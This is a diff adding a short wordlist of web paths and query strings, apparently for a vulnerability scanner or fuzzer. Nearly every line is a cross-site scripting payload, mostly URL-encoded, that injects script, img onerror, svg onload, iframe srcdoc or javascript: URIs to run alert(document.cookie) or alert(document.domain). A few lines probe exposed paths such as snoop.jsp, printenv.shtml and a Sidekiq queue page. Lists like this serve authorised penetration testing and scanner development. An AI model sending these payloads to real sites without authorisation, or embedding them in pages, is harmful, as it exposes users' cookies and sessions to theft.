@@ -1,0 +1,24 @@
+/examples/jsp/snp/snoop.jsp
+/.well-known/acme-challenge/%3C%3fxml%20version=%221.0%22%3f%3E%3Cx:script%20xmlns:x=%22http://www.w3.org/1999/xhtml%22%3Ealert%28document.domain%26%23x29%3B%3C/x:script%3E
+/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e
+/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
+/mobile/error-not-supported-platform.html?desktop_url=javascript:alert(1337);//itms://
+/webapp/?fccc%27\%22%3E%3Csvg/onload=alert(xss)%3E
+/?mobile=1&mp_idx=%22;alert(%271%27);//
+/sidekiq/queues/
+/<script>alert(
+/?id=<script>alert(
+/?id=<center><a+href%3D
+/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+/?id=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+/%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+/?id=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+/%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E
+/?id=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E
+/%22%3E%3Csvg/onload=alert(document.cookie)%3E
+/?id=%22%3E%3Csvg/onload=alert(document.cookie)%3E
+/?q=<center><a+href%3D
+/?q=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
+/?q=%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+/?q=%22%3E%3Ciframe%20srcdoc=%22%3Cscript%3Ealert(document.cookie)%3C/script%3E%22%3E%3C/iframe%3E
+/admin.back<img src=a onerror=alert(
